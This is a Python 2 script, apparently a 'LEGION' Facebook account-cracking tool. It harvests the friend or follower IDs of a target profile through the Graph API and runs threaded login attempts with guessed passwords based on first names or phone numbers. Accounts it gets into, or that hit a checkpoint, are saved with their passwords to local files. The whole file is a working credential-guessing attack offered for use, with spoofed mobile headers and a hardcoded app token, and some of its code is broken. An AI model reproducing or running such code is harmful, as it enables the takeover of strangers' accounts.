 #coding=utf-8
#!/usr/bin/python2
#coding=utf-8
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

agents = ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo ="""   
   \033[1;37m

    ██      ███████  ██████  ██  ██████  ███    ██ 
    ██      ██      ██       ██ ██    ██ ████   ██ 
    ██      █████   ██   ███ ██ ██    ██ ██ ██  ██ 
    ██      ██      ██    ██ ██ ██    ██ ██  ██ ██  
    ███████ ███████  ██████  ██  ██████  ██   ████ 
                                         
\033[1;37m========================================================
\033[1;37m[*] \033[1;91m AUTHOR   ➤ \x1b[1;37mLEGION-XD
\033[1;37m[*] \033[1;91m FACEBOOK ➤ \x1b[1;37mLɘʛɩoŋ
\033[1;37m[*] \033[1;91m GITHUB   ➤ \x1b[1;37mhttps://github.com/L3G10N
\033[1;37m========================================================"""
                   
def main():
	os.system("clear")
	print(logo)
	print("")
	print(" \x1b[1;37m    \tMain menu")
	print("")
	os.system('echo -e "========================================================"')
	print(" \x1b[1;37m     [1] START CLONING\n")
	os.system('echo -e "========================================================"')
	print("")
	os.system('xdg-open https://www.facebook.com/LEGION.XWD ')
	log_sel()
def log_sel():
	sel = raw_input(" Choose  ➤: ")
	if sel =="1":
		login()
	elif sel =="2":
		ran()
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def login():
	try:
		token = open("legion_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("")
		print(" \x1b[1;37m  \tFacebook login")
		print("")
		os.system('echo -e "========================================================"')
		print(" \x1b[1;37m   [1] FACEBOOK ID/PASS LOGIN\n")
		print(" \x1b[1;37m   [2] FACEBOOK TOKEN LOGIN\n")
		print("  \x1b[1;91m  [3] Back ")
		os.system('echo -e "-========================================================"')
		print("")
		log_select()
def log_select():
	sel = raw_input(" Choose  ➤: ")
	if sel =="1":
		log_fb()
	elif sel =="2":
		token()
	elif sel =="3":
		ran()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def log_fb():
	os.system("clear")
	try:
		token = open("legion_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
		print("")
		print("\tFacebook id/pass login")
		print("")
		uid = raw_input(" Uid: ")
		passw = raw_input(" Password: ")
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav = open("legion_token.txt", "w")
			sav.write(q["access_token"])
			sav.close()
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			print("\tAccount has checkpoint")
			print("")
			time.sleep(1)
			login()
		else:
			print("")
			print("\tId/pass my be wrong")
			print("")
			time.sleep(1)
def token():
    os.system("clear")
    try:
        token = open("legion_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("")
        print("\tLogin token")
        print("")
        os.system('echo -e "========================================================"')
        token = raw_input        (" Paste token    ➤: ")
        os.system('echo -e "====================================================" ')
        sav = open("legion_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("legion_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf legion_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("Welcome: "+name)
    print("Status: Active")
    print("")
    print("")
    os.system('echo -e "========================================================"')
    print(" \x1b[1;37m[1]  CRACK AUTO PASS\n")
    print(" \x1b[1;37m[2]  CRACK CHOICE PASS\n")
    print(' \x1b[1;37m[3]  Back')
    os.system('echo -e "========================================================"')
    print("")
    menu_option()
def menu_option():
	select = raw_input(" Choose  ➤: ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
		
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("legion_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")
	print("")
	os.system('echo -e "========================================================"')
	print("\x1b[1;37m       [1] CRACK PUBLIC ID")
	print("\x1b[1;37m       [2] CRACK FOLLOWERS")
	print("\x1b[1;37m       [3] Back")
	os.system('echo -e "========================================================"')
	print("")
	crack_select()
def crack_select():
	select = raw_input(" Choose  ➤: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\tAUTO PASS CRAKING")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("\tAUTO PASS CRAKING")
			print('')
			print("  Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tAUTO PASS CRACKING")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tAUTO PASS CRAKING')
			print('')
			print("  Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		crack_select()
	os.system('echo -e "========================================================"')
	print(" \x1b[1;37m   Total IDs : "+str(len(id)))
	print(" \x1b[1;37m   The Process has started")
	print("   \x1b[1;37m Press ctrl + z to stop")
	os.system('echo -e "========================================================"')
	print("")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()+"123"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("legion_ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("legion_cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+"1234"
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("legion_cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"12345"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("legion_ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"@123"
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("legion_ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("legion_cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+'@12345'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("legion_ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("legion_cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
													
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	os.system('echo -e "========================================================"')
	print("   \x1b[1;37mThe process has been completed")
	print("   \x1b[1;37m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "========================================================"')
	print("")
	print("  ")
	raw_input(" Press enter to back ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("legion_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")
	print("")
	os.system('echo -e "========================================================"')
	print("\x1b[1;37m       [1] CRACK PUBLIC ID")
	print("\x1b[1;37m       [2] CRACK FOLLOWERS")
	print("\x1b[1;37m       [3] Back")
	os.system('echo -e "========================================================"')
	print("")
	choice_select()
def choice_select():
	select = raw_input("Choose  ➤: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\CHOICE PASS CRACK CRACKING")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\Choice pass cracking')
			print("")
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\CHOICE PASS CRACK CRACKING")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\Choice pass cracking')
			print('')
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option\033[0;97m")
		print("")
		choice_select()
	os.system('echo -e "========================================================"')
	print(" \x1b[1;37m   Total IDs : "+str(len(id)))
	print(" \x1b[1;37m   The Process has started")
	print("    \x1b[1;37m Press ctrl + z to stop")
	os.system('echo -e "========================================================"')
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("legion_ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("legion_cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("legion_cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;92m [LEGION-SUCCESFULL] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("legion_ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	os.system('echo -e "========================================================"')
	print("   \x1b[1;37mThe process has been completed")
	print("   \x1b[1;37m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "========================================================"')
	print("")
	print("  ")
	raw_input(" Press enter to back ")
	choice()
def ran():
	id=[]
	cps=[]
	oks=[]
	os.system("clear")
	print(logo)
	print("")
	print("\tRandom number cloning")
	print("")
	co = raw_input(" Enter number: ")
	k = "+92"
	try:
		file = ".txt"
		for line in open(file, "r").readlines():
			id.append(line.strip())
	except:
		exit(" An error has occured")
	print("  Total numbers: "+str(len(id)))
	print("  The process has started")
	print("  Press ctrl + z to stop")
	print(' ')
	print(47*"-")
	print('')
	print("")
	def main(arg):
		user=arg
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = "786786"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[LEGION-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("legion_ok.txt", "a")
				ok.write(k+co+user+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;37m [LEGION-CHECKPOINT] "+k+co+user+" | "+pass1+"\033[0;97m")
					cp = open("legion_cp.txt", "a")
					cp.write(k+co+user+"|"+pass1+"\n")
					cp.close()
					cps.append(k+co+user+pass1)
				else:
					pass2 = user
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[LEGION-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("legion_ok.txt", "a")
						ok.write(k+co+user+"|"+pass2+"\n")
						ok.close()
						oks.append(k+co+user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;37m [LEGION-CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("legion_cp.txt", "a")
							cp.write(k+co+user+"|"+pass2+"\n")
							cp.close()
							cps.append(k+co+user+pass2)
						else:
							pass3 = k+co+user
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m[LEGION-SUCCESFULL] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
								ok = open("legion_ok.txt", "a")
								ok.write(k+co+user+"|"+pass3+"\n")
								ok.close()
								oks.append(k+co+user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;37m [LEGION-CHECKPOINT] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("legion_cp.txt", "a")
									cp.write(k+co+user+"|"+pass3+"\n")
									cp.close()
									cps.append(k+co+user+pass3)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	os.system('echo -e "========================================================"')
	print("   \x1b[1;37mThe process has been completed")
	print("   \x1b[1;37m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "========================================================"')
	print("")
	print("CLONING SUCCESFULL -LEGION ")
	raw_input(" Press enter to back ")
	main()
	
	
if __name__ == '__main__':
	main()
